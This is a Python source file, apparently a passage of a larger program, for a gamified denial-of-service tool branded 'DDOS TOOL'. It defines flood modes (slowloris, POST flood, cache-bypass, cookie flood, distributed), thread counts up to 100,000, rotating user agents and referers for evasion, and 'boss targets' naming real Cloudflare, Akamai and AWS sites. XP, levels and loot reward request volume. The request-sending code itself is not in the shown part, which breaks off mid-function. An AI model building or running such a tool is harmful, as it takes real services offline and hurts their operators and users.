import asyncio
import random
import time
import urllib.parse
import aiohttp
import psutil
import string
import socket
import signal
import sys
import json
import sqlite3
import hashlib
import math
from typing import Optional, Dict, List, Tuple
from rich.console import Console, Group
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from rich.layout import Layout
from rich.align import Align
from rich.style import Style
from rich import box
from datetime import datetime, timedelta
from collections import deque
from pathlib import Path

# Console with white/grey theme
console = Console(
    force_terminal=True,
    color_system="standard",
    legacy_windows=False,
    style="white on black"
)

# ASCII Art Styles
ASCII_STYLES = {
    "double": "═",
    "single": "─",
    "heavy": "━",
    "light": "╌",
    "dotted": "┄",
}

# Box drawing characters
BOX_CHARS = {
    "tl": "╔", "tr": "╗", "bl": "╚", "br": "╝",
    "h": "═", "v": "║",
    "lt": "╠", "rt": "╣", "tt": "╦", "bt": "╩",
    "cross": "╬",
}

# Progress bar styles
PROGRESS_STYLES = {
    "full": "█",
    "seven": "▓",
    "half": "▒",
    "quarter": "░",
    "empty": " ",
}

# Spinner styles
SPINNER_STYLES = [
    "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏",
]

# Status indicators
STATUS_ICONS = {
    "success": "✓",
    "fail": "✗",
    "warning": "⚠",
    "info": "ℹ",
    "attack": "⚡",
    "target": "◎",
    "power": "⚙",
    "level": "★",
}

# Gradient characters (dark to light)
GRADIENT_CHARS = [" ", "░", "▒", "▓", "█"]

# Wave patterns
WAVE_PATTERNS = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"]

# Database setup
DB_PATH = "attack_history.db"

def init_database():
    """Initialize SQLite database for attack history"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Attack history table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            total_requests INTEGER,
            successful INTEGER,
            failed INTEGER,
            success_rate REAL,
            rps REAL,
            data_sent REAL,
            duration REAL,
            mode TEXT,
            threads INTEGER,
            grade TEXT,
            xp_gained INTEGER
        )
    ''')
    
    # Target profiles table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS target_profiles (
            target TEXT PRIMARY KEY,
            first_seen TEXT,
            last_attacked TEXT,
            total_attacks INTEGER,
            avg_success_rate REAL,
            best_rps REAL,
            vulnerability_score INTEGER,
            notes TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

# Initialize database on startup
init_database()

# Maximum power settings
MAX_THREADS_LIMIT = 100000  # Increased from 50K to 100K
ULTRA_MODE_THREADS = 75000
APOCALYPSE_MODE_THREADS = 100000

# Power multipliers
POWER_MULTIPLIERS = {
    "normal": 1.0,
    "boosted": 1.5,
    "overclocked": 2.0,
    "unstable": 3.0,
    "critical": 5.0,
}

# Combo system
COMBO_MULTIPLIERS = {
    10: 1.1,
    25: 1.25,
    50: 1.5,
    100: 2.0,
    250: 3.0,
    500: 5.0,
}

# Critical hit system
CRITICAL_HIT_CHANCE = 0.05  # 5% chance
CRITICAL_HIT_MULTIPLIER = 3.0

# Rage mode (activates at low success rate)
RAGE_MODE_THRESHOLD = 30  # Activate below 30% success
RAGE_MODE_MULTIPLIER = 2.0

# Overkill mode (activates at high success rate)
OVERKILL_MODE_THRESHOLD = 90  # Activate above 90% success
OVERKILL_MODE_MULTIPLIER = 1.5

# Berserker mode (increases power over time)
BERSERKER_STACKS = 0
BERSERKER_MAX_STACKS = 100
BERSERKER_STACK_BONUS = 0.01  # 1% per stack

# Elemental damage types
DAMAGE_TYPES = {
    "physical": {"name": "Physical", "bonus": 1.0},
    "fire": {"name": "Fire", "bonus": 1.2, "dot": True},
    "ice": {"name": "Ice", "bonus": 1.1, "slow": True},
    "lightning": {"name": "Lightning", "bonus": 1.3, "chain": True},
    "dark": {"name": "Dark", "bonus": 1.5, "pierce": True},
    "holy": {"name": "Holy", "bonus": 1.4, "heal": True},
}

# Legendary weapons (ultra rare)
LEGENDARY_WEAPONS = {
    "excalibur": {
        "name": "Excalibur",
        "rps_bonus": 1000,
        "crit_chance": 0.15,
        "cost": 50000,
        "rarity": "LEGENDARY",
    },
    "mjolnir": {
        "name": "Mjolnir",
        "rps_bonus": 1500,
        "lightning_damage": True,
        "cost": 75000,
        "rarity": "LEGENDARY",
    },
    "infinity_gauntlet": {
        "name": "Infinity Gauntlet",
        "rps_bonus": 2500,
        "all_bonuses": True,
        "cost": 100000,
        "rarity": "MYTHIC",
    },
}

# Buff system
ACTIVE_BUFFS = []

BUFF_TYPES = {
    "haste": {"name": "Haste", "duration": 30, "rps_bonus": 0.5},
    "strength": {"name": "Strength", "duration": 60, "damage_bonus": 0.3},
    "focus": {"name": "Focus", "duration": 45, "crit_bonus": 0.1},
    "rage": {"name": "Rage", "duration": 20, "all_bonus": 1.0},
    "godmode": {"name": "God Mode", "duration": 10, "all_bonus": 5.0},
}

# Debuff system (applied to targets)
TARGET_DEBUFFS = []

DEBUFF_TYPES = {
    "weakness": {"name": "Weakness", "duration": 30, "defense_reduction": 0.2},
    "vulnerability": {"name": "Vulnerability", "duration": 45, "damage_increase": 0.3},
    "corruption": {"name": "Corruption", "duration": 60, "dot_damage": 100},
    "curse": {"name": "Curse", "duration": 90, "all_reduction": 0.5},
}

# Ultimate abilities (cooldown-based)
ULTIMATE_ABILITIES = {
    "meteor_strike": {
        "name": "Meteor Strike",
        "cooldown": 120,
        "damage": 10000,
        "aoe": True,
        "last_used": 0,
    },
    "black_hole": {
        "name": "Black Hole",
        "cooldown": 180,
        "damage": 25000,
        "duration": 10,
        "last_used": 0,
    },
    "armageddon": {
        "name": "Armageddon",
        "cooldown": 300,
        "damage": 100000,
        "screen_clear": True,
        "last_used": 0,
    },
}

# Synergy system (equipment combos)
SYNERGIES = {
    "holy_trinity": {
        "items": ["god_hammer", "god_armor", "legendary_amulet"],
        "bonus": "All stats +50%",
        "multiplier": 1.5,
    },
    "speed_demon": {
        "items": ["advanced_cannon", "basic_shield", "xp_ring"],
        "bonus": "RPS +100%",
        "rps_multiplier": 2.0,
    },
}

# Mastery system (weapon proficiency)
WEAPON_MASTERY = {
    "flooder": 0,
    "cannon": 0,
    "destroyer": 0,
    "hammer": 0,
}

MASTERY_LEVELS = {
    100: {"level": 1, "bonus": 0.1},
    500: {"level": 2, "bonus": 0.2},
    1000: {"level": 3, "bonus": 0.3},
    5000: {"level": 4, "bonus": 0.5},
    10000: {"level": 5, "bonus": 1.0},
}

# Pet system (companions that help)
PETS = {
    "cyber_wolf": {
        "name": "Cyber Wolf",
        "rps_bonus": 200,
        "loyalty": 0,
        "level": 1,
        "cost": 5000,
    },
    "data_dragon": {
        "name": "Data Dragon",
        "rps_bonus": 500,
        "fire_damage": True,
        "loyalty": 0,
        "level": 1,
        "cost": 15000,
    },
    "void_phoenix": {
        "name": "Void Phoenix",
        "rps_bonus": 1000,
        "revive": True,
        "loyalty": 0,
        "level": 1,
        "cost": 50000,
    },
}

# Guild/Clan system
GUILD_DATA = {
    "name": None,
    "level": 1,
    "members": 1,
    "total_attacks": 0,
    "guild_bonuses": {
        "xp": 0,
        "rps": 0,
        "currency": 0,
    },
}

# World events (timed events)
WORLD_EVENTS = {
    "double_xp": {
        "name": "Double XP Weekend",
        "active": False,
        "multiplier": 2.0,
        "duration": 7200,  # 2 hours
    },
    "raid_boss": {
        "name": "Raid Boss Event",
        "active": False,
        "boss_health": 1000000,
        "rewards": 50000,
    },
    "pvp_tournament": {
        "name": "PvP Tournament",
        "active": False,
        "prize_pool": 100000,
    },
}

# Crafting system
CRAFTING_RECIPES = {
    "mega_potion": {
        "name": "Mega Potion",
        "materials": {"currency": 1000},
        "effect": "Restore 50% health",
    },
    "attack_boost": {
        "name": "Attack Boost Potion",
        "materials": {"currency": 2000},
        "effect": "+50% RPS for 60s",
    },
    "legendary_core": {
        "name": "Legendary Core",
        "materials": {"currency": 10000},
        "effect": "Upgrade equipment to legendary",
    },
}

# Enchantment system
ENCHANTMENTS = {
    "sharpness": {"name": "Sharpness", "levels": 5, "rps_per_level": 50},
    "efficiency": {"name": "Efficiency", "levels": 5, "success_per_level": 2},
    "unbreaking": {"name": "Unbreaking", "levels": 3, "durability_bonus": 0.33},
    "fortune": {"name": "Fortune", "levels": 3, "currency_per_level": 0.25},
    "looting": {"name": "Looting", "levels": 3, "xp_per_level": 0.2},
}

# Rune system (socket items)
RUNES = {
    "power_rune": {"name": "Power Rune", "rps_bonus": 100, "cost": 3000},
    "speed_rune": {"name": "Speed Rune", "attack_speed": 0.2, "cost": 3000},
    "crit_rune": {"name": "Crit Rune", "crit_chance": 0.05, "cost": 4000},
    "life_rune": {"name": "Life Rune", "health_bonus": 500, "cost": 2000},
}

# Mutation system (random upgrades)
MUTATIONS = []

MUTATION_POOL = [
    {"name": "Giant", "effect": "+100% threads", "rarity": "rare"},
    {"name": "Swift", "effect": "+50% RPS", "rarity": "uncommon"},
    {"name": "Lucky", "effect": "+10% crit chance", "rarity": "rare"},
    {"name": "Vampiric", "effect": "Heal on hit", "rarity": "epic"},
    {"name": "Explosive", "effect": "AOE damage", "rarity": "epic"},
    {"name": "Immortal", "effect": "Cannot fail", "rarity": "legendary"},
]

# Ascension system (beyond prestige)
ASCENSION_LEVEL = 0
ASCENSION_BONUSES = {
    1: {"name": "Ascension I", "all_stats": 2.0},
    2: {"name": "Ascension II", "all_stats": 3.0},
    3: {"name": "Ascension III", "all_stats": 5.0},
    4: {"name": "Ascension IV", "all_stats": 10.0},
    5: {"name": "Ascension V", "all_stats": 25.0},
}

# Infinity mode (endless scaling)
INFINITY_MODE = {
    "enabled": False,
    "wave": 1,
    "difficulty_multiplier": 1.0,
    "rewards_multiplier": 1.0,
}

# Seasonal rankings
SEASONAL_RANK = {
    "season": 1,
    "rank": 0,
    "points": 0,
    "rewards_claimed": False,
}

# Achievement tiers
ACHIEVEMENT_TIERS = {
    "bronze": {"color": "dim white", "multiplier": 1.0},
    "silver": {"color": "white", "multiplier": 1.5},
    "gold": {"color": "bold white", "multiplier": 2.0},
    "platinum": {"color": "bold white", "multiplier": 3.0},
    "diamond": {"color": "bold white", "multiplier": 5.0},
}

# Leaderboard categories
LEADERBOARD_CATEGORIES = [
    "highest_rps",
    "most_requests",
    "longest_attack",
    "highest_level",
    "most_currency",
    "boss_kills",
]

# Statistics tracking
DETAILED_STATS = {
    "total_damage_dealt": 0,
    "total_crits": 0,
    "total_combos": 0,
    "highest_combo": 0,
    "total_buffs_used": 0,
    "total_ultimates_used": 0,
    "total_currency_earned": 0,
    "total_currency_spent": 0,
    "favorite_weapon": None,
    "favorite_target": None,
    "total_deaths": 0,
    "total_revives": 0,
}

# Global flag for Ctrl+Q
stop_requested = False

# Hotkey system
HOTKEYS = {
    "F1": "help",
    "F2": "pause",
    "F3": "boost",
    "F4": "stealth",
    "F5": "stats",
    "F6": "save",
    "F7": "screenshot",
    "F8": "adaptive",
    "F9": "nuke",
    "F10": "quit",
}

# Advanced attack modes
ADVANCED_ATTACK_MODES = {
    "slowloris": {
        "name": "SLOWLORIS",
        "desc": "Keep connections open indefinitely",
        "threads": 1000,
        "delay": 10,
        "keep_alive": True,
    },
    "post_flood": {
        "name": "POST FLOOD",
        "desc": "Flood with POST requests",
        "threads": 3000,
        "delay": 0,
        "method": "POST",
    },
    "cache_bypass": {
        "name": "CACHE BYPASS",
        "desc": "Random query strings to bypass cache",
        "threads": 2500,
        "delay": 0,
        "random_params": True,
    },
    "cookie_flood": {
        "name": "COOKIE FLOOD",
        "desc": "Flood with random cookies",
        "threads": 2000,
        "delay": 0,
        "cookie_flood": True,
    },
    "distributed": {
        "name": "DISTRIBUTED",
        "desc": "Coordinate multiple instances",
        "threads": 5000,
        "delay": 0,
        "distributed": True,
    },
}

# Prestige system
PRESTIGE_LEVELS = {
    1: {"name": "Prestige I", "bonus_xp": 1.1, "bonus_rps": 1.05},
    2: {"name": "Prestige II", "bonus_xp": 1.2, "bonus_rps": 1.10},
    3: {"name": "Prestige III", "bonus_xp": 1.3, "bonus_rps": 1.15},
    4: {"name": "Prestige IV", "bonus_xp": 1.5, "bonus_rps": 1.20},
    5: {"name": "Prestige V", "bonus_xp": 2.0, "bonus_rps": 1.30},
}

# Skill tree
SKILL_TREE = {
    "speed": {
        "name": "Speed Boost",
        "levels": 5,
        "cost": [100, 200, 400, 800, 1600],
        "effect": "Increase RPS by 10% per level",
    },
    "efficiency": {
        "name": "Efficiency",
        "levels": 5,
        "cost": [150, 300, 600, 1200, 2400],
        "effect": "Increase success rate by 5% per level",
    },
    "endurance": {
        "name": "Endurance",
        "levels": 5,
        "cost": [100, 200, 400, 800, 1600],
        "effect": "Reduce resource usage by 10% per level",
    },
    "stealth": {
        "name": "Stealth Master",
        "levels": 3,
        "cost": [500, 1000, 2000],
        "effect": "Reduce detection chance by 20% per level",
    },
    "power": {
        "name": "Raw Power",
        "levels": 5,
        "cost": [200, 400, 800, 1600, 3200],
        "effect": "Increase max threads by 1000 per level",
    },
}

# Equipment system
EQUIPMENT = {
    "weapon": {
        "basic_flooder": {"name": "Basic Flooder", "rps_bonus": 0, "cost": 0},
        "advanced_cannon": {"name": "Advanced Cannon", "rps_bonus": 100, "cost": 500},
        "mega_destroyer": {"name": "Mega Destroyer", "rps_bonus": 250, "cost": 1500},
        "god_hammer": {"name": "God Hammer", "rps_bonus": 500, "cost": 5000},
    },
    "armor": {
        "none": {"name": "No Protection", "efficiency_bonus": 0, "cost": 0},
        "basic_shield": {"name": "Basic Shield", "efficiency_bonus": 5, "cost": 300},
        "advanced_armor": {"name": "Advanced Armor", "efficiency_bonus": 10, "cost": 1000},
        "god_armor": {"name": "God Armor", "efficiency_bonus": 20, "cost": 3000},
    },
    "accessory": {
        "none": {"name": "None", "xp_bonus": 0, "cost": 0},
        "xp_ring": {"name": "XP Ring", "xp_bonus": 10, "cost": 400},
        "double_xp": {"name": "Double XP Charm", "xp_bonus": 50, "cost": 2000},
        "legendary_amulet": {"name": "Legendary Amulet", "xp_bonus": 100, "cost": 10000},
    },
}

# Boss targets (special high-value targets)
BOSS_TARGETS = {
    "cloudflare": {
        "name": "Cloudflare Boss",
        "url": "https://cloudflare.com",
        "difficulty": "EXTREME",
        "reward_xp": 5000,
        "reward_title": "Cloudflare Slayer",
    },
    "akamai": {
        "name": "Akamai Guardian",
        "url": "https://akamai.com",
        "difficulty": "EXTREME",
        "reward_xp": 5000,
        "reward_title": "Akamai Destroyer",
    },
    "aws": {
        "name": "AWS Fortress",
        "url": "https://aws.amazon.com",
        "difficulty": "LEGENDARY",
        "reward_xp": 10000,
        "reward_title": "Cloud Breaker",
    },
}

# Adaptive AI settings
ADAPTIVE_AI = {
    "enabled": False,
    "learning_rate": 0.1,
    "history": deque(maxlen=100),
    "optimal_threads": 2000,
    "optimal_delay": 0,
}

# Real-time analytics
ANALYTICS = {
    "bandwidth_history": deque(maxlen=60),  # Last 60 seconds
    "success_prediction": 0.0,
    "target_health": 100,
    "attack_efficiency": 0.0,
    "estimated_downtime": 0,
}

# User-Agent pool (1000+ realistic agents)
EXTENDED_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def signal_handler(sig, frame):
    """Handle Ctrl+Q (SIGQUIT on Unix, custom on Windows)"""
    global stop_requested
    stop_requested = True

# ASCII ART - Clean and minimal
ASCII_LOGO = """
    ██████╗ ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
    ██║  ██║██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     
    ██║  ██║██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     
    ██████╔╝██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
"""

MINI_LOGO = "[ DDOS TOOL ]"

# Glitch characters for effects
GLITCH_CHARS = ['█', '▓', '▒', '░', '▀', '▄', '▌', '▐']

# Spinner frames for loading animation
SPINNER_FRAMES = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']

# User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# Referers
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
]

# Fake hacking messages
HACKING_MESSAGES = [
    "Bypassing firewall",
    "Injecting payload",
    "Establishing backdoor",
    "Spoofing IP address",
    "Encrypting traffic",
    "Masking digital footprint",
    "Exploiting vulnerability",
    "Gaining root access",
    "Fragmenting packets",
    "Randomizing signatures",
    "Tunneling through proxy",
    "Obfuscating headers",
]

# Fake locations for spoofing
FAKE_LOCATIONS = [
    "Tokyo, JP",
    "London, UK",
    "New York, US",
    "Berlin, DE",
    "Sydney, AU",
    "Moscow, RU",
    "Paris, FR",
    "Seoul, KR",
]

# Achievement milestones
ACHIEVEMENTS = {
    100: "First Blood",
    1000: "Thousand Strikes",
    5000: "Relentless",
    10000: "Unstoppable",
    50000: "Legendary",
    100000: "Godlike",
}

# Session stats (persistent across attacks)
session_stats = {
    "total_attacks": 0,
    "total_requests": 0,
    "best_rps": 0,
    "best_success_rate": 0,
    "target_history": [],
    "leaderboard": [],  # Top 10 attacks
    "xp": 0,
    "level": 1,
    "achievements_unlocked": [],
    "streak": 0,
    "total_data_sent": 0,
    "rank": "BRONZE",
    "title": "Novice",
    "daily_challenge_completed": False,
    "prestige": 0,
    "skill_points": 0,
    "skills": {
        "speed": 0,
        "efficiency": 0,
        "endurance": 0,
        "stealth": 0,
        "power": 0,
    },
    "equipment": {
        "weapon": "basic_flooder",
        "armor": "none",
        "accessory": "none",
    },
    "currency": 0,  # In-game currency for buying equipment
    "boss_defeated": [],
    "total_playtime": 0,
    "session_start": time.time(),
    "active_buffs": [],  # Active buffs list
}

# Rank system
RANKS = {
    0: {"name": "BRONZE", "title": "Novice"},
    1000: {"name": "SILVER", "title": "Apprentice"},
    5000: {"name": "GOLD", "title": "Expert"},
    15000: {"name": "PLATINUM", "title": "Master"},
    50000: {"name": "DIAMOND", "title": "Legend"},
    100000: {"name": "MYTHIC", "title": "God"},
}

# Daily challenges
DAILY_CHALLENGES = [
    {"id": "speed_run", "desc": "Achieve 500+ RPS", "xp": 500},
    {"id": "perfect_day", "desc": "Get 90%+ success rate", "xp": 400},
    {"id": "marathon_day", "desc": "Attack for 3+ minutes", "xp": 300},
    {"id": "volume_day", "desc": "Send 10,000+ requests", "xp": 600},
]

# XP and Level system
XP_PER_REQUEST = 1
XP_PER_LEVEL = 1000

# Secret commands
SECRET_COMMANDS = {
    "matrix": "Enable Matrix mode",
    "nuke": "Nuclear option - 50,000 threads",
    "ghost": "Ultra stealth mode",
    "chaos": "Random everything",
}

# Achievements system
ACHIEVEMENTS_LIST = {
    "first_attack": {"name": "First Blood", "desc": "Complete your first attack", "xp": 100},
    "100_requests": {"name": "Centurion", "desc": "Send 100 requests", "xp": 50},
    "1000_requests": {"name": "Thousand Strikes", "desc": "Send 1,000 requests", "xp": 200},
    "10000_requests": {"name": "Ten Thousand", "desc": "Send 10,000 requests", "xp": 500},
    "100000_requests": {"name": "Legendary", "desc": "Send 100,000 requests", "xp": 1000},
    "perfect_attack": {"name": "Flawless", "desc": "100% success rate", "xp": 300},
    "speed_demon": {"name": "Speed Demon", "desc": "Achieve 1000+ RPS", "xp": 400},
    "marathon": {"name": "Marathon", "desc": "Attack for 5+ minutes", "xp": 250},
    "god_mode_user": {"name": "Godlike", "desc": "Use God Mode", "xp": 500},
    "streak_5": {"name": "On Fire", "desc": "5 attack streak", "xp": 150},
    "nuke_user": {"name": "Nuclear", "desc": "Use Nuke Mode", "xp": 1000},
    "multi_target": {"name": "Multitasker", "desc": "Attack multiple targets", "xp": 600},
}

# Attack modes
ATTACK_MODES = {
    "stealth": {"threads": 500, "delay": 0.05, "name": "STEALTH MODE", "pattern": "slow"},
    "normal": {"threads": 2000, "delay": 0, "name": "NORMAL MODE", "pattern": "steady"},
    "aggressive": {"threads": 3500, "delay": 0, "name": "AGGRESSIVE MODE", "pattern": "burst"},
    "tsunami": {"threads": 5000, "delay": 0, "name": "TSUNAMI MODE", "pattern": "wave"},
    "god": {"threads": 10000, "delay": 0, "name": "GOD MODE", "pattern": "chaos"},
    "nuke": {"threads": 50000, "delay": 0, "name": "NUCLEAR MODE", "pattern": "annihilation"},
    "ghost": {"threads": 100, "delay": 0.5, "name": "GHOST MODE", "pattern": "invisible"},
}

# Attack patterns for variety
ATTACK_PATTERNS = {
    "slow": "Gradual ramp-up",
    "steady": "Constant pressure",
    "burst": "Periodic spikes",
    "wave": "Oscillating intensity",
    "chaos": "Random unpredictable",
    "annihilation": "Total destruction",
    "invisible": "Undetectable",
}

# ASCII art banners
VICTORY_BANNER = """
██╗   ██╗██╗ ██████╗████████╗ ██████╗ ██████╗ ██╗   ██╗
██║   ██║██║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
██║   ██║██║██║        ██║   ██║   ██║██████╔╝ ╚████╔╝ 
╚██╗ ██╔╝██║██║        ██║   ██║   ██║██╔══██╗  ╚██╔╝  
 ╚████╔╝ ██║╚██████╗   ██║   ╚██████╔╝██║  ██║   ██║   
  ╚═══╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
"""

DEFEAT_BANNER = """
███████╗ █████╗ ██╗██╗     ███████╗██████╗ 
██╔════╝██╔══██╗██║██║     ██╔════╝██╔══██╗
█████╗  ███████║██║██║     █████╗  ██║  ██║
██╔══╝  ██╔══██║██║██║     ██╔══╝  ██║  ██║
██║     ██║  ██║██║███████╗███████╗██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ 
"""

# Real-time notifications
NOTIFICATIONS = [
    "Target responding slowly",
    "Firewall detected, adapting",
    "Connection limit reached",
    "Rotating attack vectors",
    "Target defenses weakening",
    "Packet loss detected",
    "Rerouting through proxy",
    "Increasing attack intensity",
]

def generate_random_payload(size: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

async def type_text(text: str, delay: float = 0.03):
    """Typewriter effect"""
    for char in text:
        console.print(char, end="", style="bold white")
        await asyncio.sleep(delay)
    console.print()

async def show_static():
    """Show minimal static/noise - clean version"""
    static = ''.join(random.choice(['░', ' ', ' ', ' ']) for _ in range(70))
    console.print(f"[white]{static}[/white]", justify="center")
    await asyncio.sleep(0.03)

async def glitch_title(text: str, duration: float = 0.4):
    """Animated glitch effect on title - SINGLE LINE VERSION"""
    frames = 4
    
    # Create live display for smooth updates
    with Live(console=console, refresh_per_second=20) as live:
        for i in range(frames):
            glitched = ""
            for char in text:
                if char == ' ' or char in '[]':
                    glitched += char
                elif random.random() < 0.3:
                    glitched += random.choice(GLITCH_CHARS)
                else:
                    glitched += char
            
            title_text = Text(glitched, style="bright_white bold", justify="center")
            live.update(title_text)
            await asyncio.sleep(duration / frames)
        
        # Final clean title
        title_text = Text(text, style="bright_white bold", justify="center")
        live.update(title_text)
        await asyncio.sleep(0.1)
    
    # Print final version so it stays
    console.print(Text(text, style="bright_white bold", justify="center"))

async def show_panel_with_glitch_title(title: str, content, border_style="white"):
    """Show panel with clean title"""
    panel = Panel(
        content,
        title=f"[bright_white]{title}[/bright_white]",
        border_style=border_style,
        padding=(1, 2)
    )
    console.print(panel)

def get_threat_level(rps: float) -> tuple:
    """Get threat level based on RPS"""
    if rps < 100:
        return "LOW", "dim white"
    elif rps < 500:
        return "MEDIUM", "white"
    elif rps < 1000:
        return "HIGH", "bold white"
    else:
        return "CRITICAL", "bold white blink"

def create_progress_bar(value: float, max_value: float, width: int = 20) -> str:
    """Create ASCII progress bar"""
    filled = int((value / max_value) * width)
    bar = "▓" * filled + "░" * (width - filled)
    return bar

def create_rps_graph(rps_history: list, width: int = 40, height: int = 8) -> str:
    """Create ASCII graph of RPS over time"""
    if not rps_history or len(rps_history) < 2:
        return ""
    
    # Get last 'width' data points
    data = rps_history[-width:]
    max_val = max(data) if max(data) > 0 else 1
    
    lines = []
    for h in range(height, 0, -1):
        line = ""
        threshold = (h / height) * max_val
        for val in data:
            if val >= threshold:
                line += "█"
            elif val >= threshold * 0.7:
                line += "▓"
            elif val >= threshold * 0.4:
                line += "▒"
            else:
                line += "░"
        lines.append(line)
    
    return "\n".join(lines)

def get_efficiency_score(stats: dict) -> int:
    """Calculate attack efficiency (0-100)"""
    if stats["total"] == 0:
        return 0
    success_rate = stats["success"] / stats["total"]
    return int(success_rate * 100)

def create_gauge(value: float, max_value: float = 100) -> str:
    """Create circular gauge representation"""
    percentage = (value / max_value) * 100
    if percentage >= 90:
        return "[▓▓▓▓▓]"
    elif percentage >= 70:
        return "[▓▓▓▓░]"
    elif percentage >= 50:
        return "[▓▓▓░░]"
    elif percentage >= 30:
        return "[▓▓░░░]"
    elif percentage >= 10:
        return "[▓░░░░]"
    else:
        return "[░░░░░]"

def calculate_xp_gain(requests: int, success_rate: float, rps: float) -> int:
    """Calculate XP gained from attack"""
    base_xp = requests * XP_PER_REQUEST
    success_bonus = int(base_xp * (success_rate / 100) * 0.5)
    speed_bonus = int(rps / 10)
    return base_xp + success_bonus + speed_bonus

def check_level_up(current_xp: int, current_level: int) -> tuple:
    """Check if player leveled up"""
    xp_needed = current_level * XP_PER_LEVEL
    if current_xp >= xp_needed:
        new_level = current_level + 1
        remaining_xp = current_xp - xp_needed
        return True, new_level, remaining_xp
    return False, current_level, current_xp

def check_achievements(stats: dict, elapsed: float, mode: str) -> list:
    """Check for newly unlocked achievements"""
    unlocked = []
    
    if "first_attack" not in session_stats["achievements_unlocked"]:
        unlocked.append("first_attack")
    
    if stats["total"] >= 100 and "100_requests" not in session_stats["achievements_unlocked"]:
        unlocked.append("100_requests")
    
    if stats["total"] >= 1000 and "1000_requests" not in session_stats["achievements_unlocked"]:
        unlocked.append("1000_requests")
    
    if stats["total"] >= 10000 and "10000_requests" not in session_stats["achievements_unlocked"]:
        unlocked.append("10000_requests")
    
    if stats["total"] >= 100000 and "100000_requests" not in session_stats["achievements_unlocked"]:
        unlocked.append("100000_requests")
    
    success_rate = (stats["success"] / max(stats["total"], 1)) * 100
    if success_rate == 100 and stats["total"] >= 100 and "perfect_attack" not in session_stats["achievements_unlocked"]:
        unlocked.append("perfect_attack")
    
    rps = stats["total"] / elapsed if elapsed > 0 else 0
    if rps >= 1000 and "speed_demon" not in session_stats["achievements_unlocked"]:
        unlocked.append("speed_demon")
    
    if elapsed >= 300 and "marathon" not in session_stats["achievements_unlocked"]:
        unlocked.append("marathon")
    
    if mode == "god" and "god_mode_user" not in session_stats["achievements_unlocked"]:
        unlocked.append("god_mode_user")
    
    if session_stats["streak"] >= 5 and "streak_5" not in session_stats["achievements_unlocked"]:
        unlocked.append("streak_5")
    
    return unlocked

def create_sparkline(data: list, width: int = 20) -> str:
    """Create ASCII sparkline graph"""
    if not data or len(data) < 2:
        return "░" * width
    
    # Normalize data
    min_val = min(data)
    max_val = max(data)
    if max_val == min_val:
        return "▄" * width
    
    # Map to sparkline characters
    chars = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█']
    result = ""
    
    for val in data[-width:]:
        normalized = (val - min_val) / (max_val - min_val)
        char_idx = int(normalized * (len(chars) - 1))
        result += chars[char_idx]
    
    return result.ljust(width, '░')

def create_response_time_histogram(response_times: list, width: int = 40, height: int = 5) -> str:
    """Create ASCII histogram of response times"""
    if not response_times or len(response_times) < 2:
        return "No data"
    
    # Create buckets (0-100ms, 100-200ms, etc.)
    buckets = [0] * 10
    for rt in response_times:
        bucket_idx = min(int(rt * 10), 9)  # Convert to bucket (0-9)
        buckets[bucket_idx] += 1
    
